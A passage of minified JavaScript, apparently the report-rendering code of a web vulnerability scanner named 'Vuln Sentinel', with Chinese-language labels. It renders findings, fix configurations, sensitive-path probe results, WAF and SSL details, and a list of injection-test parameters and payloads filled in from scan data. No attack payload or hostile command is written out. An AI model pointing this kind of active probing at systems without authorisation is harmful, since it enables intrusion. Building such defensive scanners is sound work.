0;list-style:none">展开技术细节</summary><div style="background:#313335;border:1px solid #555555;padding:10px;border-radius:2px;margin-top:6px">'+le+"</div></details>":x+='<details class="finding-section" style="cursor:pointer"><summary style="font-weight:600;font-size:13px;color:var(--text-primary);padding:6px 0;list-style:none">展开技术细节</summary><div style="background:#313335;border:1px solid #555555;padding:10px;border-radius:2px;margin-top:6px;font-size:12px;color:var(--text-lighter)">无额外技术细节</div></details>'}if(l.fixes&&Object.keys(l.fixes).length>0){let le=l.fixes,we={nginx:"Nginx",apache:"Apache",express:"Express",flask:"Flask/FastAPI",spring_boot:"Spring Boot",cloudflare:"Cloudflare"},f=["nginx","apache","express","flask","spring_boot","cloudflare"].filter(function(U){return le[U]&&le[U].length>0});if(f.length>0){let U=L;x+='<div style="margin-top:8px">',x+='<div style="display:flex;gap:4px;margin-bottom:8px;flex-wrap:wrap">',f.forEach(function(F,S){let k=S===0;x+=`<button onclick="switchFixPlatform('`+F+`', 'finding-fix-')" id="finding-fix-tab-`+F+'" style="padding:4px 10px;border-radius:2px;border:1px solid '+(k?"var(--primary)":"var(--border)")+";background:"+(k?"var(--primary)":"transparent")+";color:"+(k?"#fff":"var(--text-secondary)")+';cursor:pointer;font-size:12px">'+we[F]+"</button>"}),x+="</div>",f.forEach(function(F,S){let k=S===0?"block":"none";x+='<div id="finding-fix-content-'+F+'" style="display:'+k+'">',le[F].forEach(function(C,W){let Z=typeof C=="string"?C:C.code||"",R=typeof C=="object"&&C.risk_note||"",V="fix-copy-"+F+"-"+W;x+='<div style="position:relative;margin-bottom:6px">',x+='<pre style="background:#2b2b2b;border:1px solid #555555;padding:10px;padding-right:50px;border-radius:2px;font-size:12px;overflow-x:auto;white-space:pre-wrap;margin:0">'+w(Z)+"</pre>",x+=`<button onclick="copyFixCode('`+V+`')" id="`+V+`-btn" aria-label="复制修复代码" style="position:absolute;top:6px;right:6px;padding:6px 12px;min-height:0;background:#45494a;color:#bbbbbb;border:1px solid #555555;border-radius:2px;font-size:12px;font-weight:600;cursor:pointer;transition:background 0.15s" onmouseover="this.style.background='#4b6eaf';this.style.color='#fff'" onmouseout="this.style.background='#45494a';this.style.color='#bbbbbb'">复制</button>`,x+='<textarea id="'+V+'" style="position:absolute;left:-9999px">'+w(Z)+"</textarea>",x+="</div>",R&&(x+='<div style="font-size:12px;color:#f0a732;padding:4px 8px;background:#3d2929;border-radius:2px;margin-bottom:6px">'+w(R)+"</div>")}),x+="</div>"}),x+="</div>"}}if(l.remediation&&(x+='<div class="finding-section"><h4>修复步骤</h4><ul>',(l.remediation.steps||[]).forEach(function(le){x+="<li>"+w(le)+"</li>"}),x+="</ul></div>",l.remediation.nginx&&(x+='<div class="finding-section"><h4>服务器配置</h4><div class="code-block">'+w(l.remediation.nginx)+"</div></div>"),l.remediation.apache&&(x+='<div class="finding-section"><h4>Apache 配置</h4><div class="code-block">'+w(l.remediation.apache)+"</div></div>"),l.remediation.node&&(x+='<div class="finding-section"><h4>Node.js 配置</h4><div class="code-block">'+w(l.remediation.node)+"</div></div>"),l.remediation.verify&&(x+='<div class="finding-section"><h4>验证方法</h4><p>'+w(l.remediation.verify)+"</p></div>")),l.verify_steps&&l.verify_steps.length>0?(x+='<div class="finding-section">',x+="<h4>验证修复（三步验证法）</h4>",x+='<div style="display:flex;flex-direction:column;gap:10px;margin-top:8px">',l.verify_steps.forEach(function(le,we){let f=["1.","2.","3."][we]||we+1+".";x+='<div style="background:#313335;border:1px solid #555555;border-radius:2px;padding:10px 12px;border-left:3px solid var(--success)">',x+='<div style="display:flex;align-items:center;gap:6px;margin-bottom:6px">',x+='<span style="font-size:12px;font-weight:700;color:var(--text-primary)">第 '+(we+1)+" 步："+w(le.method||"验证")+"</span>",x+="</div>",le.command&&(x+='<div style="font-size:12px;color:var(--text-secondary);margin-bottom:5px">操作：</div>',x+='<pre style="margin:0 0 6px 0;padding:6px 8px;background:#0f172a;color:#a7f3d0;border-radius:2px;font-size:12px;line-height:1.4;overflow-x:auto;white-space:pre-wrap;word-break:break-all">'+w(le.command)+"</pre>"),le.expect&&(x+='<div style="font-size:12px;color:var(--text-secondary);display:flex;align-items:flex-start;gap:4px">',x+='<span style="color:#73c990;font-weight:700;flex-shrink:0">预期：</span>',x+='<span style="color:var(--text-primary)">'+w(le.expect)+"</span>",x+="</div>"),x+="</div>"}),x+="</div>",x+='<div style="margin-top:8px;padding:6px 10px;background:rgba(115,201,144,0.08);border-radius:2px;font-size:12px;color:#15803d;border:1px solid rgba(115,201,144,0.2)">',x+="<strong>提示：</strong>建议按顺序执行三步验证，全部通过后再使用本工具重新扫描确认。",x+="</div>",x+="</div>"):l.verify_method&&(x+='<div class="finding-section"><h4>验证方法</h4><p>'+w(l.verify_method)+"</p></div>"),l.evidence&&Object.keys(l.evidence).length>0){x+='<div style="margin-top:8px;padding:10px;background:var(--bg-secondary);border-radius:2px;font-size:12px">',x+='<div style="font-weight:600;margin-bottom:4px;color:var(--primary)">证据详情</div>';let le=li(l.evidence);le?x+=le:x+='<div style="color:var(--text-lighter)">无额外技术细节</div>',x+="</div>"}let ge=l.confidence_level||"",re=typeof l.confidence=="number"?l.confidence:null,oe=l.cv_reason||"",ae="finding-confidence";ge==="高"?ae+=" high":ge==="中"?ae+=" medium":ge==="低"?ae+=" low":re!==null&&(re>=80?ae+=" high":re>=60?ae+=" medium":ae+=" low"),x+='<div class="finding-feedback-row" data-finding-name="'+w(l.name)+'" data-scan-id="'+D+'">',x+='<span style="color:var(--text-light)">置信度</span>',ge?x+='<span class="'+ae+'">'+w(ge)+"</span>":re!==null?x+='<span class="'+ae+'">'+re+"%</span>":x+='<span class="'+ae+'">未评估</span>',oe&&(x+='<span style="font-size:12px;color:var(--text-lighter)">· '+w(oe)+"</span>"),(l.review_required||ge==="中")&&(x+='<span style="font-size:11px;background:var(--warning);color:#000;padding:1px 6px;border-radius:2px;margin-left:6px">建议复核</span>');let ne=$&&($.is_false_positive||$.is_confirmed)?" disabled":"";x+=`<button class="finding-feedback-btn btn-confirm" onclick="submitFindingFeedback(this, '`+xe(l.name)+"', "+D+', false)" '+ne+">准确</button>",x+=`<button class="finding-feedback-btn btn-fp" onclick="submitFindingFeedback(this, '`+xe(l.name)+"', "+D+', true)" '+ne+">误报</button>",$&&$.is_false_positive?x+='<span class="fp-reason-text">已标记为误报，将用于优化后续检测</span>':$&&$.is_confirmed&&(x+='<span class="fp-reason-text" style="color:#73c990">已确认为真实问题，感谢您的反馈</span>'),x+="</div>",x+="</div></div>"}),e.findings&&e.findings.length>0&&(n+='<div class="result-workbench">',n+='<div class="result-list-panel"><div class="result-list-header">发现项（'+e.findings.length+')</div><div class="result-list">'+_+"</div></div>",n+='<div class="result-detail-panel" id="result-detail-panel">'+x+"</div>",n+="</div>"),e.fixes&&Object.keys(e.fixes).length>0){let l=e.fixes,L={nginx:"Nginx",apache:"Apache",express:"Express",flask:"Flask/FastAPI",spring_boot:"Spring Boot",cloudflare:"Cloudflare"},D=["nginx","apache","express","flask","spring_boot","cloudflare"].filter(function($){return l[$]&&l[$].length>0});D.length>0&&(n+='<div class="card fade-in-up" style="animation-delay:0.3s;border:2px solid rgba(115,201,144,0.4);background:#3c3f41,rgba(115,201,144,0.01))">',n+='<div style="font-weight:700;font-size:16px;margin-bottom:10px;color:var(--success)"> 建议（'+D.length+" 种平台）</div>",n+='<div style="display:flex;gap:4px;margin-bottom:12px;flex-wrap:wrap">',D.forEach(function($,q){let te=q===0;n+=`<button onclick="switchFixPlatform('`+$+`')" id="fix-tab-`+$+'" style="padding:6px 14px;border-radius:2px;border:1px solid '+(te?"var(--primary)":"var(--border)")+";background:"+(te?"var(--primary)":"transparent")+";color:"+(te?"#fff":"var(--text-secondary)")+';cursor:pointer;font-size:12px">'+L[$]+"</button>"}),n+="</div>",D.forEach(function($,q){let te=q===0?"block":"none";n+='<div id="fix-content-'+$+'" style="display:'+te+'">',l[$].forEach(function(B){let A=typeof B=="string"?B:B.code||"",ee=typeof B=="object"&&B.risk_note||"";n+='<pre style="background:var(--bg-secondary);padding:12px;border-radius:2px;font-size:12px;overflow-x:auto;white-space:pre-wrap;margin-bottom:8px">'+w(A)+"</pre>",ee&&(n+='<div style="font-size:12px;color:#f0a732;padding:4px 8px;background:rgba(240,167,50,0.1);border-radius:2px;margin-bottom:8px">'+w(ee)+"</div>")}),n+="</div>"}),n+="</div>")}n+='<div class="gen-fix-section fade-in-up" style="animation-delay:0.4s">',n+="<h3> 一键生成修复配置</h3>",n+='<p class="card-desc" style="margin-bottom:14px">输入您的配置，系统将根据扫描结果生成可直接参考的建议</p>',n+='<div class="gen-fix-row">',n+='<input type="text" id="gen-fix-input" placeholder="粘贴配置或输入 server 块..." />',n+='<button class="gen-fix-btn" onclick="generateFixFromResult()"> 生成</button>',n+="</div>",n+='<div id="gen-fix-output"></div>',n+="</div>";let I=Math.min(100,112);if(n+='<div class="score-compare fade-in-up" style="animation-delay:0.45s">',n+="<h3> 复测后评分对比</h3>",n+='<div class="score-rings">',n+='<div class="score-ring-item">',n+='<div class="ring" style="background:'+Ht(e.score)+'">',n+='<div class="val" style="color:#fff">'+e.score+"</div>",n+='<div class="lbl" style="color:rgba(255,255,255,0.7)">复测前</div>',n+="</div>",n+='<div class="tag">复测前</div>',n+="</div>",n+='<div class="score-ring-item">',n+='<div class="ring" id="score-after-ring" style="background:'+Ht(I)+'">',n+='<div class="val" style="color:#fff">'+I+"</div>",n+='<div class="lbl" style="color:rgba(255,255,255,0.7)">复测后</div>',n+="</div>",n+='<div class="tag">复测后</div>',n+="</div>",n+="</div>",n+='<div class="score-improve" id="score-diff"> 提升 <strong>'+(I-e.score)+"</strong> 分 <span>（"+e.score+" -> "+I+"）</span></div>",n+='<div class="score-rules"><p>评分规则：基础 100 分 - 高风险(18) - 中风险(10) - 低风险(4) + 修复配置(+12) + PR修复(+10)</p></div>',n+="</div>",e.ssl_info&&e.ssl_info.has_cert){n+='<div class="card fade-in-up" style="animation-delay:0.32s">',n+='<div class="card-title"> SSL 证书信息</div>';let l=e.ssl_info;n+='<div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;font-size:13px">',n+='<div><span style="color:var(--text-lighter)">域名:</span> '+w(l.subject||"N/A")+"</div>",n+='<div><span style="color:var(--text-lighter)">签发机构:</span> '+w(l.issuer||"N/A")+"</div>",n+='<div><span style="color:var(--text-lighter)">TLS 版本:</span> '+w(l.version||"N/A")+"</div>",n+='<div><span style="color:var(--text-lighter)">密码套件:</span> '+w(l.cipher||"N/A")+"</div>",n+='<div><span style="color:var(--text-lighter)">剩余天数:</span> '+(l.days_left!=null?l.days_left+" 天":"N/A")+"</div>",n+='<div><span style="color:var(--text-lighter)">过期时间:</span> '+w(l.not_after||"N/A")+"</div>",l.san&&l.san.length>0&&(n+='<div style="grid-column:1/-1"><span style="color:var(--text-lighter)">SAN:</span> '+w(l.san.join(", "))+"</div>"),n+="</div>",l.expired?n+='<div style="margin-top:8px;padding:6px 10px;background:rgba(199,84,80,0.1);border-radius:2px;color:var(--danger);font-size:12px;font-weight:600">证书已过期！</div>':l.days_left!=null&&l.days_left<30&&(n+='<div style="margin-top:8px;padding:6px 10px;background:rgba(240,167,50,0.1);border-radius:2px;color:var(--warning);font-size:12px;font-weight:600">证书将在 '+l.days_left+" 天后过期</div>"),l.weak&&(n+='<div style="margin-top:8px;padding:6px 10px;background:rgba(240,167,50,0.1);border-radius:2px;color:var(--warning);font-size:12px;font-weight:600">使用弱加密协议/套件</div>'),n+="</div>"}if(e.waf&&e.waf.length>0&&(n+='<div class="card fade-in-up" style="animation-delay:0.34s">',n+='<div class="card-title"> WAF 防护检测</div>',n+='<div style="display:flex;flex-wrap:wrap;gap:8px;margin-bottom:10px">',e.waf.forEach(function(l){n+='<span style="display:inline-flex;align-items:center;gap:4px;padding:4px 10px;background:rgba(59,130,246,0.15);color:#4b6eaf;border:1px solid rgba(59,130,246,0.3);border-radius:2px;font-size:12px;font-weight:600">'+w(l.name)+"</span>"}),n+="</div>",n+='<div style="padding:8px 12px;background:rgba(59,130,246,0.06);border-radius:2px;font-size:12px;color:var(--text-light);line-height:1.5">',n+="WAF 提供应用层防护，但不能替代 HSTS、CSP、Cookie 安全策略等配置。下方发现的缺失项仍需修复。",n+="</div>",n+="</div>"),e.sensitive_paths&&e.sensitive_paths.length>0){let l=e.sensitive_paths.filter(function($){return $.exposed}),L=e.sensitive_paths.filter(function($){return $.suspect}),J=e.sensitive_paths.filter(function($){return $.info}),D=e.sensitive_paths.filter(function($){return!$.exposed&&!$.suspect&&!$.info});n+='<div class="card fade-in-up" style="animation-delay:0.36s">',n+='<div class="card-title"> 敏感路径探测</div>',l.length>0&&(n+='<div style="margin-bottom:12px">',n+='<div style="font-size:13px;font-weight:700;color:var(--danger);margin-bottom:6px;padding:4px 8px;background:rgba(199,84,80,0.08);border-radius:2px;border-left:3px solid var(--danger)"> 确认漏洞 ('+l.length+")</div>",n+='<div style="font-size:12px;line-height:2">',l.forEach(function($){n+='<div style="color:var(--danger)">'+w($.path)+' <span style="color:var(--text-lighter)">['+$.status+"]</span>  已暴露 ("+($.size||"-")+" bytes)</div>"}),n+="</div></div>"),L.length>0&&(n+='<div style="margin-bottom:12px">',n+='<div style="font-size:13px;font-weight:700;color:var(--warning);margin-bottom:6px;padding:4px 8px;background:rgba(240,167,50,0.08);border-radius:2px;border-left:3px solid var(--warning)">疑似风险 ('+L.length+")</div>",n+='<div style="font-size:12px;line-height:2">',L.forEach(function($){n+='<div style="color:var(--warning)">'+w($.path)+' <span style="color:var(--text-lighter)">['+$.status+"]</span> "+w($.reason||"疑似误报，需复核")+"</div>"}),n+="</div></div>"),J.length>0&&(n+='<div style="margin-bottom:12px">',n+='<div style="font-size:13px;font-weight:700;color:#4b6eaf;margin-bottom:6px;padding:4px 8px;background:rgba(59,130,246,0.08);border-radius:2px;border-left:3px solid #4b6eaf">信息： 公开信息 ('+J.length+")</div>",n+='<div style="font-size:12px;line-height:2">',J.forEach(function($){n+='<div style="color:#4b6eaf">'+w($.path)+' <span style="color:var(--text-lighter)">['+$.status+"]</span> 信息： 公开信息</div>"}),n+="</div></div>"),D.length>0&&(n+='<div style="font-size:12px;line-height:2">',D.forEach(function($){$.protected?n+='<div style="color:var(--success)">'+w($.path)+' <span style="color:var(--text-lighter)">['+$.status+"]</span>  已保护</div>":n+='<div style="color:var(--text-lighter)">'+w($.path)+' <span style="color:var(--text-lighter)">['+$.status+"]</span></div>"}),n+="</div>"),n+="</div>"}if(e.crawled_pages&&e.crawled_pages.length>0&&(n+='<div class="card fade-in-up" style="animation-delay:0.38s">',n+='<div class="card-title"> 爬取页面 ('+e.crawled_pages.length+" 页)</div>",n+='<div style="font-size:12px;line-height:2;max-height:200px;overflow-y:auto">',e.crawled_pages.forEach(function(l){n+='<div style="display:flex;align-items:center;gap:6px;padding:4px 0;border-bottom:1px solid var(--border-light)">',n+='<span style="color:'+(l.status===200?"var(--success)":"var(--warning)")+';font-weight:600;min-width:30px">['+l.status+"]</span>",n+='<span style="flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap" title="'+w(l.url)+'">'+w(l.url)+"</span>",l.forms>0&&(n+='<span style="color:var(--warning);font-size:12px">'+l.forms+" 表单</span>"),l.inputs>0&&(n+='<span style="color:var(--primary);font-size:12px">'+l.inputs+" 输入框</span>"),n+="</div>"}),n+="</div></div>"),e.vuln_tests&&e.vuln_tests.length>0){let l=e.vuln_tests.filter(function(J){return J.vulnerable}).length,L=e.vuln_tests.length;n+='<div class="card fade-in-up" style="animation-delay:0.40s">',n+='<div class="card-title"> 参数与表单验证</div>',n+='<div style="display:flex;gap:12px;margin-bottom:10px;font-size:13px">',n+='<span style="color:var(--text-secondary)">检测项总数: <strong>'+L+"</strong></span>",n+='<span style="color:'+(l>0?"var(--danger)":"var(--success)")+'">发现漏洞: <strong>'+l+"</strong></span>",n+="</div>",n+='<div style="font-size:12px;line-height:1.8;max-height:180px;overflow-y:auto">',e.vuln_tests.forEach(function(J){let D=J.vulnerable?"var(--danger)":"var(--text-lighter)",$=(J.vulnerable,"");n+='<div style="color:'+D+';padding:2px 0">',n+=$+" ["+J.type+"] "+w(J.param)+"="+w(J.payload)+" ("+w(J.url.substring(0,50))+"...)</div>"}),n+="</div></div>"}e.scan_type==="deep"&&(n+='<div style="text-align:center;margin:12px 0">',n+='<span style="display:inline-block;padding:4px 14px;background:rgba(75,110,175,0.1);color:var(--primary);border-radius:2px;font-size:12px;font-weight:600">深度扫描模式 - 含参数与表单验证</span>',n+="</div>");let z=e.findings.filter(function(l){return l.owasp==="A05 安全配置错误"||l.owasp==="A02 加密机制失效"||l.name.indexOf("缺少")===0});z.length>0&&(n+='<div class="card fade-in-up" style="animation-delay:0.42s">',n+='<div class="card-title"> 一键生成修复配置</div>',n+='<p style="font-size:13px;color:var(--text-secondary);margin-bottom:10px">检测到 '+z.length+" 个配置类问题，可自动生成 Nginx 修复配置。</p>",n+='<div class="fixer-btns">',n+='<button class="fixer-btn primary" onclick="goToFixerWithScanResult()"> 生成修复配置</button>',n+='<div class="report-download-dropdown">',n+='<button class="pdf-download-btn" onclick="toggleReportDropdown()"> 下载报告 <span style="font-size:11px">▼</span></button>',n+='<div class="report-dropdown-menu" id="report-dropdown">',n+=`<div onclick="downloadReport('pdf');toggleReportDropdown()" style="padding:8px 14px;cursor:pointer;font-size:13px;display:flex;align-items:center;gap:8px" onmouseover="this.style.background='var(--bg-secondary)'" onmouseout="this.style.background='transparent'">`,n+='<span>PDF</span><span>PDF 格式</span><span style="margin-left:auto;font-size:12px;color:var(--text-secondary)">适合打印存档</span>',n+="</div>",n+=`<div onclick="downloadReport('html');toggleReportDropdown()" style="padding:8px 14px;cursor:pointer;font-size:13px;display:flex;align-items:center;gap:8px" onmouseover="this.style.background='var(--bg-secondary)'" onmouseout="this.style.background='transparent'">`,n+='<span>HTML</span><span>HTML 格式</span><span style="margin-left:auto;font-size:12px;color:var(--text-secondary)">精美可交互</span>',n+="</div>",n+="</div></div>",n+='<button class="fixer-btn success" id="verify-fix-btn" onclick="verifyFix()"> 验证修复效果</button>',n+="</div>",n+="</div>"),n+='<div class="card fade-in-up" style="animation-delay:0.7s;background:#3c3f41,rgba(115,201,144,0.02));border:1px solid rgba(115,201,144,0.2);text-align:center">',n+='<h3 class="card-title" style="color:var(--success)"> 扫描完成</h3>',n+='<p style="color:var(--text-secondary);margin-bottom:16px">将修复配置应用到服务器后，点击下方按钮重新扫描验证效果</p>',n+='<div style="display:flex;gap:10px;justify-content:center;flex-wrap:wrap">',n+='<button class="btn btn-primary" onclick="verifyFix()"> 验证修复效果</button>',n+='<button class="btn btn-secondary" onclick="shareResult()"> 分享报告</button>',n+=`<button class="btn btn-secondary" onclick="downloadReport('pdf')"> 下载 PDF</button>`,n+="</div>",n+="</div>",n+='<div class="card fade-in-up" style="animation-delay:0.72s;background:#3c3f41,rgba(168,85,247,0.04));border:1px solid rgba(75,110,175,0.2)">',n+='<div class="card-title"> PDF 报告内容说明</div>',n+='<div style="font-size:12px;color:var(--text-secondary);line-height:1.8">',n+="<div> <strong>风险摘要</strong>：确认漏洞数 / 疑似风险数 / 配置缺失数总览</div>",n+="<div> <strong>证据详情</strong>：每个 finding 的响应头值、敏感路径内容片段、WAF 检测依据</div>",n+="<div> <strong>建议</strong>：按服务器类型（Nginx、Apache、Express、Flask、Spring Boot、Cloudflare）分类的修复配置，含优先级排序</div>",n+="<div> <strong>复测结果</strong>：上次 vs 本次分数对比、新增问题、已修复问题列表</div>",n+="<div> <strong>评分变化</strong>：如有历史记录，展示分数变化趋势</div>",n+="</div>",n+='<div style="margin-top:10px;text-align:center">',n+=`<button class="btn btn-primary" onclick="downloadReport('pdf')"> 下载 PDF 报告</button>`,n+="</div>",n+="</div>";let M=e.sensitive_paths?e.sensitive_paths.filter(function(l){return l.exposed}).length:0,O=e.sensitive_paths?e.sensitive_paths.filter(function(l){return l.suspect}).length:0,j=e.sensitive_paths?e.sensitive_paths.filter(function(l){return l.info}).length:0,P=e.findings?e.findings.filter(function(l){return l.name.indexOf("缺少")===0}).length:0,H=e.findings?e.findings.filter(function(l){return l.type==="config"&&l.name.indexOf("缺少")!==0}).length:0,K=[];if(M>0?K.push("发现 "+M+" 个确认级敏感文件泄露"):K.push("未发现确认级敏感文件泄露"),O>0&&K.push("检测到 "+O+" 个疑似 WAF/登录页响应"),P>0||H>0){let l=P+H;K.push("另有 "+l+" 项安全响应头/配置缺失")}let E=K.join("，")+"。";n+='<div class="card fade-in-up" style="animation-delay:0.72s;background:#3c3f41,rgba(168,85,247,0.04));border:1px solid rgba(75,110,175,0.2)">',n+='<div class="card-title"> 扫描总评</div>',n+='<div style="font-size:14px;line-height:1.8;font-weight:500">'+w(E)+"</div>",n+='<div style="margin-top:10px;font-size:12px;line-height:2">',M>0&&(n+='<div style="color:var(--danger)"> 确认漏洞：'+M+" 个敏感文件可直接访问，需立即修复</div>"),O>0&&(n+='<div style="color:var(--warning)">疑似风险：'+O+" 个路径返回 200，但内容命中 WAF/登录页/反爬特征，因此不判定为真实泄露，建议复核</div>"),j>0&&(n+='<div style="color:var(--primary)">信息： 公开信息：'+j+" 个路径为公开协议文件（如 robots.txt），仅作为信息项展示</div>"),P>0&&(n+='<div style="color:var(--text-secondary)">&#x2022; 配置缺失：'+P+" 个安全响应头未配置</div>"),n+="</div>",e.restricted?(n+='<div style="margin-top:10px;padding:8px 12px;background:rgba(240,167,50,0.1);border-radius:2px;color:var(--warning);font-size:12px;line-height:1.6">',n+="<strong>受限扫描提示</strong><br/>",n+="目标存在 WAF / CDN / 登录 / 反爬限制，可能影响结果完整性。建议优先扫主域名，必要时先完成验证。",n+="</div>"):M===0&&O===0&&(P>0||H>0)&&(n+='<div style="margin-top:10px;padding:8px 12px;background:rgba(115,201,144,0.08);border-radius:2px;color:var(--success);font-size:12px">',n+=" 未发现敏感文件泄露，整体风险可控。建议优先补充缺失的安全响应头以提升评分。",n+="</div>"),n+="</div>",(function(){let l="",L="",J=!1,D="",$="",q=!1,te="",B="",A=!1,ee=e.findings.some(function(ne){return ne.type==="exposed"||ne.name&&ne.name.indexOf("敏感路径")>=0}),Y=e.findings.some(function(ne){return ne.severity==="high"&&ne.name&&(ne.name.indexOf("HSTS")>=0||ne.name.indexOf("CSP")>=0)}),X=e.findings.some(function(ne){return(ne.severity==="medium"||ne.severity==="low")&&ne.type==="config"}),ge=e.findings.some(function(ne){return ne.name&&ne.name.indexOf("Server")>=0}),re=e.findings.filter(function(ne){return ne.severity==="high"&&ne.name&&ne.name.indexOf("缺少")===0}),oe=e.findings.filter(function(ne){return(ne.severity==="medium"||ne.severity==="low")&&ne.name&&ne.name.indexOf("缺少")===0});if(ee?(l="修复 exposed 敏感路径（限制 .env/.git 等文件访问）",L="预计提升 20 分",J=!1):Y?(l="修复 high severity 响应头缺失（CSP / HSTS）",L="预计提升 15 分",J=!1):(l="无紧急暴露路径，响应头配置良好",L="保持当前状态",J=!0),X||ge||oe.length>0){let ne=[];oe.length>0&&ne.push("补充 "+oe.length+" 个 medium/low 响应头"),ge&&ne.push("隐藏 Server 版本信息"),D=ne.join(" + ")||"检查并优化配置项",$="预计提升 8 分",q=!1}else D="medium/low 配置已完善，Server 信息已隐藏",$="无需操作",q=!0;te="生成修复配置后重新扫描，确认分数提升",B="验证闭环",A=J&&q;let ae=function(ne){return ne?'<span style="display:inline-flex;align-items:center;gap:4px;background:rgba(115,201,144,0.15);color:#73c990;border:1px solid rgba(115,201,144,0.3);border-radius:2px;padding:2px 10px;font-size:12px;font-weight:600"> 已完成</span>':'<span style="display:inline-flex;align-items:center;gap:4px;background:rgba(240,167,50,0.15);color:#f0a732;border:1px solid rgba(240,167,50,0.3);border-radius:2px;padding:2px 10px;font-size:12px;font-weight:600"> 未开始</span>'};n+='<div class="card fade-in-up" style="animation-delay:0.75s;background:#3c3f41,rgba(16,185,129,0.04));border:1px solid rgba(115,201,144,0.2)">',n+='<div class="card-title"> 修复优先级路线</div>',n+='<div style="display:flex;flex-direction:column;gap:10px">',n+='<div style="background:rgba(0,0,0,0.15);border:1px solid rgba(115,201,144,0.15);border-radius:2px;padding:12px 14px">',n+='<div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:6px">',n+='<strong style="font-size:13px;color:#73c990">1. 第一步（立即）</strong>',n+=ae(J),n+="</div>",n+='<div style="font-size:12px;color:var(--text-secondary);line-height:1.6">'+l+"</div>",n+='<div style="margin-top:6px;font-size:12px;color:#73c990;font-weight:600">'+L+"</div>",n+="</div>",n+='<div style="text-align:center;color:rgba(115,201,144,0.6);font-size:16px">-></div>',n+='<div style="background:rgba(0,0,0,0.15);border:1px solid rgba(115,201,144,0.15);border-radius:2px;padding:12px 14px">',n+='<div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:6px">',n+='<strong style="font-size:13px;color:#73c990">2. 第二步（今天）</strong>',n+=ae(q),n+="</div>",n+='<div style="font-size:12px;color:var(--text-secondary);line-height:1.6">'+D+"</div>",n+='<div style="margin-top:6px;font-size:12px;color:#73c990;font-weight:600">'+$+"</div>",n+="</div>",n+='<div style="text-align:center;color:rgba(115,201,144,0.6);font-size:16px">-></div>',n+='<div style="background:rgba(0,0,0,0.15);border:1px solid rgba(115,201,144,0.15);border-radius:2px;padding:12px 14px">',n+='<div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:6px">',n+='<strong style="font-size:13px;color:#73c990">3. 第三步（复测）</strong>',n+=ae(A),n+="</div>",n+='<div style="font-size:12px;color:var(--text-secondary);line-height:1.6">'+te+"</div>",n+='<div style="margin-top:6px;font-size:12px;color:#73c990;font-weight:600">'+B+"</div>",n+="</div>",n+="</div></div>"})(),n+='<div style="margin-top:20px;padding:16px;background:var(--bg-secondary);border-radius:2px;font-size:12px;color:var(--text-secondary)">',n+='<div style="font-weight:600;margin-bottom:8px">交付说明</div>',n+="<div>本次交付覆盖：HTTPS/TLS 配置、安全响应头（HSTS/CSP/X-Frame-Options 等 15+ 项）、Cookie 安全属性、CORS 策略、敏感路径暴露、登录态与重定向风险、弱口令与限流策略、XSS / SQL 注入 / SSRF 线索识别、WAF 识别。</div>",n+='<div style="margin-top:4px">不进行：破坏性攻击、主动利用、授权外目标测试和深度渗透动作。</div>',n+='<div style="margin-top:4px;color:var(--text-light)">如需更全面的安全评估，可在当前报告基础上追加专项复测或人工审计。</div>',n+='<div style="margin-top:8px;font-weight:600">如何验收</div>',n+="<div>每个发现项都附有请求、响应、命中签名和摘要信息。建议先看证据，再结合二次扫描结果和原始响应确认；复测后重新扫描，对比评分和证据变化即可验证效果。</div>",n+='<div style="margin-top:8px;font-weight:600">证据分层</div>',n+="<div>“已验证”表示证据充分；“建议复核”表示线索较强但仍建议人工确认；“待人工复核”表示命中线索较弱，需人工再看一眼。</div>",n+='<div style="margin-top:8px;font-weight:600">适用范围</div>',n+="<div>本报告覆盖 HTTP/TLS 配置、安全响应头、Cookie 标记、CORS、敏感路径、登录态/重定向线索、基础注入线索和 WAF 识别，不包含破坏性利用或深度渗透动作。</div>",n+='<div style="margin-top:8px;font-weight:600">交付声明</div>',n+="<div>本报告由 Vuln Sentinel 自动生成，仅反映扫描时刻的目标配置状况，可用于客户交付、项目验收和修复跟踪，不构成完整安全审计结论。</div>",n+="</div>";let N=document.getElementById("result-content");if(!N){setTimeout(function(){St(e)},0);return}N.innerHTML=n,xn(e),wn(e.score)}catch(i){console.error("renderResult error:",i);let t=document.getElementById("result-content");t&&(t.innerHTML='<div class="card" style="text-align:center;padding:40px 20px"><div style="font-size:48px;margin-bottom:12px">!</div><h3 style="color:var(--danger);margin-bottom:8px">报告渲染出错</h3><p style="color:var(--text-secondary);font-size:13px;margin-bottom:16px">页面在渲染扫描报告时遇到问题，但扫描数据本身是完整的。</p><p style="color:var(--text-lighter);font-size:12px;margin-bottom:16px">错误信息：'+w(i.message||String(i))+'</p><button class="btn btn-primary" onclick="location.reload()"> 刷新页面重试</button></div>')}}function la(){if(!de||!de.redirect_reason){T("无法识别跳转目标地址");return}let i=de.redirect_reason.match(/https?:\/\/[^\s\)]+/);if(i&&i[0]){let t=i[0],r=document.getElementById("scan-url");r&&(r.value=t),ki()}else T("无法识别跳转目标地址")}function da(){if(!de||!de.scan_id){T("当前结果暂不支持分享");return}ce("/api/history?limit=1").then(function(e){return e.json()}).then(function(e){let i=(e.history||[])[0];if(!i||!i.share_id){T("分享链接生成失败");return}let t=window.location.origin+"/api/share/"+i.share_id;navigator.clipboard&&navigator.clipboard.writeText?navigator.clipboard.writeText(t).then(function(){T("分享链接已复制到剪贴板")}):prompt("复制以下分享链接：",t)})}function ca(){let e='<div class="card fade-in-up" style="background:#3c3f41,rgba(168,85,247,0.04));border:1px solid rgba(75,110,175,0.2);text-align:center">';e+='<div style="font-size:18px;margin-bottom:8px"></div>',e+='<div style="font-size:15px;font-weight:700;margin-bottom:6px">客户交付报告已生成</div>',e+='<div style="font-size:12px;color:var(--text-secondary);line-height:1.7;margin-bottom:12px">',e+="报告包含以下内容：<br>",e+=" 风险摘要（已验证、建议复核、待人工复核）<br>",e+=" 证据清单（响应头值、敏感路径片段、置信度、WAF 检测依据）<br>",e+=" 修复建议（按业务优先级分类，含处置顺序）<br>",e+=" 复测结果（上次与本次分数对比、新增与已修复问题）<br>",e+=" 评分变化趋势（如有历史记录）",e+="</div>",e+=`<button class="btn btn-primary" onclick="downloadReport('pdf')"> 立即下载 PDF</button>`,e+="</div>";let i=document.getElementById("result-content");i&&i.insertAdjacentHTML("afterbegin",e)}function pa(e){Rn(e)}function Rn(e){document.querySelectorAll(".result-list-item").forEach(function(r){r.classList.remove("active")});let 